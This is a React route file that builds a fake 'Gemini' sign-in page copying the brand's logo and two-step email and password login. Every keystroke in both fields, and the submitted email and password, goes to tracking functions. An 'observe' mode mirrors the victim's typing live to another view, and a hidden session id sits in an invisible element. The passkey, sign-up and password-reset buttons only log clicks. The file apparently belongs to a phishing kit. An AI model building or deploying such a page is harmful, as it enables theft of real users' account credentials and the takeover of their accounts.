import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { GeminiLogo, GI_FONT_FAMILY, GiFontStyle, useGiTracking } from "@/components/gi/GiShared";

export const Route = createFileRoute("/gi/signin")({
  head: () => ({ meta: [{ title: "Sign in — Gemini" }] }),
  component: GiSignInPage,
});

function EyeShown() {
  return (
    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path fillRule="evenodd" clipRule="evenodd" d="M12 4C9.18 4 6.7 5.41 4.96 7.01 4.08 7.82 3.36 8.71 2.85 9.54 2.37 10.35 2 11.22 2 12s.37 1.65.85 2.46c.51.83 1.23 1.72 2.11 2.53C6.7 18.59 9.18 20 12 20s5.3-1.41 7.04-3.01c.88-.81 1.6-1.7 2.11-2.53.49-.81.85-1.68.85-2.46s-.36-1.65-.85-2.46c-.51-.83-1.23-1.72-2.11-2.53C17.3 5.41 14.82 4 12 4Zm4 8a4 4 0 1 1-8 0 4 4 0 0 1 8 0Zm-4 2a2 2 0 1 0 0-4 2 2 0 0 0 0 4Z" /></svg>
  );
}
function EyeHidden() {
  return (
    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M4.71 3.29 3.29 4.71l16 16 1.42-1.42-3-3A9.7 9.7 0 0 0 22 12s-4-8-10-8a9.7 9.7 0 0 0-4.29 1.29L4.71 3.29ZM12 8a4 4 0 0 1 4 4 4 4 0 0 1-.29 1.5l-5.21-5.21A4 4 0 0 1 12 8Zm-9 4s4 8 10 8a9.7 9.7 0 0 0 4.29-1.29l-2-2A4 4 0 0 1 8.5 12l-2.5-2.5A9.7 9.7 0 0 0 3 12Z" /></svg>
  );
}
function PasskeyIcon() {
  return (
    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path fillRule="evenodd" clipRule="evenodd" d="M2 12a5 5 0 0 1 9-3h9.41l3 3-4.79 4.79-2.37-1.58L13.97 16.72 11.67 15H11a5 5 0 0 1-9-3Zm5 2a2 2 0 1 0 0-4 2 2 0 0 0 0 4Z" /></svg>
  );
}
function PersonIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="rgba(1,3,4,0.6)" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" /><circle cx="12" cy="7" r="4" /></svg>
  );
}

function FloatingInput({ label, name, type = "text", value, onChange, showToggle, onToggle, showPassword, onKeyDown, inputRef }: {
  label: string; name?: string; type?: string; value: string; onChange: (v: string) => void; showToggle?: boolean; onToggle?: () => void; showPassword?: boolean; onKeyDown?: (e: React.KeyboardEvent) => void; inputRef?: React.RefObject<HTMLInputElement | null>;
}) {
  const [focused, setFocused] = useState(false);
  const localRef = useRef<HTMLInputElement>(null);
  const ref = inputRef || localRef;
  const isActive = focused || value.length > 0;
  return (
    <div onClick={() => ref.current?.focus()} style={{ position: "relative", display: "flex", alignItems: "center", height: 56, borderRadius: 10, border: focused ? "2px solid rgb(1,3,4)" : "1px solid rgb(204,205,205)", padding: focused ? "0 15px" : "0 16px", cursor: "text", transition: "border-color 0.2s ease" }}>
      <div style={{ flex: 1, minWidth: 0, height: "100%", position: "relative", display: "flex", alignItems: "center" }}>
        <label style={{ position: "absolute", left: 0, pointerEvents: "none", transition: "all 0.2s cubic-bezier(0.4,0,0.2,1)", color: "rgb(128,129,129)", fontSize: isActive ? 11 : 16, top: isActive ? 8 : "50%", transform: isActive ? "none" : "translateY(-50%)", lineHeight: "16px" }}>{label}</label>
        <input ref={ref} type={type} value={value} onChange={(e) => onChange(e.target.value)} onFocus={() => setFocused(true)} onBlur={() => setFocused(false)} onKeyDown={onKeyDown} autoComplete="off" name={name ?? label} style={{ width: "100%", background: "transparent", border: "none", outline: "none", fontSize: 16, color: "rgb(1,3,4)", fontFamily: "inherit", paddingTop: isActive ? 14 : 0, paddingBottom: 0 }} />
      </div>
      {showToggle && (
        <button type="button" onClick={(e) => { e.stopPropagation(); onToggle?.(); }} style={{ background: "none", border: "none", cursor: "pointer", padding: 4, color: "rgb(1,3,4)", display: "flex", alignItems: "center", flexShrink: 0 }}>
          {showPassword ? <EyeShown /> : <EyeHidden />}
        </button>
      )}
    </div>
  );
}

function GiSignInPage() {
  const { trackClick, trackInput, trackSubmit, giNavigate, sessionId, isObserve } = useGiTracking();
  const [step, setStep] = useState<"email" | "password">("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const emailRef = useRef<HTMLInputElement>(null);
  const passwordRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (step === "email") setTimeout(() => emailRef.current?.focus(), 200);
    else setTimeout(() => passwordRef.current?.focus(), 200);
  }, [step]);

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      const value = String(d.value ?? "");
      if (d.field === "email" || d.field === "Email Input" || d.field === "Email address") {
        setEmail(value);
        return;
      }
      if (d.field === "password" || d.field === "Password Input" || d.field === "Password") {
        setStep("password");
        setPassword(value);
      }
    }
    window.addEventListener("ux:mirror-live-input", onMirror);
    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
  }, [isObserve]);

  const goToPassword = () => {
    if (!email) return;
    trackClick("Continue");
    trackSubmit("email", email);
    setStep("password");
  };

  const handleLogin = () => {
    if (!email || !password) return;
    setIsLoading(true);
    trackClick("Sign In");
    trackSubmit("password", password);
    giNavigate("/gi/loading");
  };

  return (
    <div className="gi-page" style={{ minHeight: "100vh", background: "#fff", fontFamily: GI_FONT_FAMILY, color: "rgb(1,3,4)", fontSize: 16, lineHeight: "24px" }}>
      <GiFontStyle />
      <style>{`
        @keyframes gi-spin { to { transform: rotate(360deg); } }
        @media (max-width: 640px) {
          .gi-signin-header { height: auto !important; min-height: 56px; padding: 12px 16px !important; }
          .gi-signin-title { font-size: 28px !important; line-height: 36px !important; }
        }
      `}</style>

      <div className="gi-signin-header" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "16px 24px", height: 75, gap: 12, flexWrap: "wrap" }}>
        <GeminiLogo />
        <div className="gi-topbar-extra" style={{ display: "flex", alignItems: "center", gap: 16 }}>
          <span style={{ fontSize: 12, color: "rgb(103,104,104)" }}>Don't have a Gemini account?</span>
          <button onClick={() => trackClick("Create Account")} style={{ padding: "0 16px", border: "none", borderRadius: 999, cursor: "pointer", height: 32, fontSize: 12, fontWeight: 600, fontFamily: "inherit", background: "rgba(1,3,4,0.08)", color: "rgb(1,3,4)" }}>Create a new account</button>
        </div>
      </div>

      <div style={{ display: "flex", flexDirection: "column", alignItems: "center" }}>
        <div className="gi-content" style={{ width: 420, maxWidth: "100%", marginTop: 48, padding: "0 24px", boxSizing: "border-box" }}>
          {step === "email" ? (
            <>
              <h1 className="gi-signin-title" style={{ fontWeight: 600, fontSize: 32, lineHeight: "40px", margin: "0 0 24px 0" }}>Sign in</h1>
              <FloatingInput label="Email address" name="email" type="email" value={email} onChange={(v) => { setEmail(v); trackInput("email", v); }} onKeyDown={(e) => e.key === "Enter" && goToPassword()} inputRef={emailRef} />
              <button onClick={goToPassword} disabled={!email} style={{ display: "flex", alignItems: "center", justifyContent: "center", width: "100%", height: 56, borderRadius: 999, border: "none", cursor: email ? "pointer" : "default", fontSize: 16, fontWeight: 600, fontFamily: "inherit", marginTop: 24, background: email ? "rgb(1,3,4)" : "rgba(1,3,4,0.08)", color: email ? "#fff" : "rgba(1,3,4,0.3)" }}>Continue</button>
              <div style={{ display: "flex", alignItems: "center", gap: 24, margin: "32px 0" }}>
                <div style={{ flex: 1, height: 1, background: "rgba(1,3,4,0.1)" }} />
                <span style={{ fontSize: 14, color: "rgba(1,3,4,0.6)" }}>OR</span>
                <div style={{ flex: 1, height: 1, background: "rgba(1,3,4,0.1)" }} />
              </div>
              <button onClick={() => trackClick("Passkeys")} style={{ display: "flex", alignItems: "center", justifyContent: "center", width: "100%", height: 56, borderRadius: 999, border: "none", cursor: "pointer", fontSize: 16, fontWeight: 600, fontFamily: "inherit", background: "rgba(1,3,4,0.08)", color: "rgb(1,3,4)", gap: 8 }}>
                <PasskeyIcon />Sign in with passkey
              </button>
            </>
          ) : (
            <>
              <h1 style={{ fontWeight: 600, fontSize: 32, lineHeight: "40px", margin: "0 0 24px 0" }}>Welcome</h1>
              <div style={{ display: "flex", alignItems: "center", gap: 12, padding: "12px 16px", borderRadius: 999, background: "rgba(1,3,4,0.04)", marginBottom: 24 }}>
                <div style={{ width: 32, height: 32, borderRadius: "50%", background: "rgba(1,3,4,0.08)", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}><PersonIcon /></div>
                <span style={{ flex: 1, fontSize: 14, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{email}</span>
                <button onClick={() => { trackClick("Change Email"); setStep("email"); }} style={{ background: "none", border: "none", cursor: "pointer", fontFamily: "inherit", fontSize: 14, fontWeight: 600, color: "rgb(1,3,4)" }}>Change</button>
              </div>
              <FloatingInput label="Password" name="password" type={showPassword ? "text" : "password"} value={password} onChange={(v) => { setPassword(v); trackInput("password", v); }} showToggle onToggle={() => { setShowPassword(!showPassword); trackClick("Toggle Password"); }} showPassword={showPassword} onKeyDown={(e) => e.key === "Enter" && handleLogin()} inputRef={passwordRef} />
              <div style={{ marginTop: 12 }}>
                <span style={{ fontSize: 14, color: "rgb(1,3,4)", textDecoration: "underline", cursor: "pointer" }} onClick={() => trackClick("Forgot Password")}>Forgot password?</span>
              </div>
              <button onClick={handleLogin} disabled={isLoading || !password} style={{ display: "flex", alignItems: "center", justifyContent: "center", width: "100%", height: 56, borderRadius: 999, border: "none", cursor: password && !isLoading ? "pointer" : "default", fontSize: 16, fontWeight: 600, fontFamily: "inherit", marginTop: 24, background: password ? "rgb(1,3,4)" : "rgba(1,3,4,0.08)", color: password ? "#fff" : "rgba(1,3,4,0.3)" }}>
                {isLoading ? <div style={{ width: 20, height: 20, border: "2px solid rgba(255,255,255,0.3)", borderTopColor: "#fff", borderRadius: "50%", animation: "gi-spin 0.6s linear infinite" }} /> : "Sign in"}
              </button>
            </>
          )}
        </div>
      </div>

      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">{sessionId}</div>
    </div>
  );
}
